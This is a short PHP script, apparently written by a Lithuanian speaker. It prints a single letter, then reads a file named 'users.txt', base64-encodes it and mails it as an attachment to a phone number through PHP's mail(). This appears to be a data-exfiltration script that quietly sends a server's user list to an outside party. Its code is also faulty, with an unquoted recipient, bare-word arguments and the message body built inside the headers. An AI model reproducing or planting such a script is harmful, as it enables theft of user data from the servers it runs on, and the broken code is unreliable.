<?php
echo"a";

function sendmsg($to, $subject, $text, $from, $file, $type) { $content = fread(fopen($file,"r"),filesize($file)); $content = chunk_split(base64_encode($content)); $uid = strtoupper(md5(uniqid(time()))); $name = basename($file); $header = "From: $from\nReply-To: $from\n"; $header .= "MIME-Version: 1.0\n"; $header .= "Content-Type: multipart/mixed; boundary=$uid\n"; $header .= "--$uid\n"; $header .= "Content-Type: text/plain\n"; $header .= "Content-Transfer-Encoding: 8bit\n\n"; $header .= "$text\n"; $header .= "--$uid\n"; $header .= "Content-Type: $type; name=\"$name\"\n"; $header .= "Content-Transfer-Encoding: base64\n"; $header .= "Content-Disposition: attachment; filename=\"$name\"\n\n"; $header .= "$content\n"; $header .= "--$uid--"; mail($to, $subject, "", $header); return true; }
$ga="users.txt";
$siusk=sendmsg(+37063087233, tema, textas, +37063087233, $ga, sms);
?>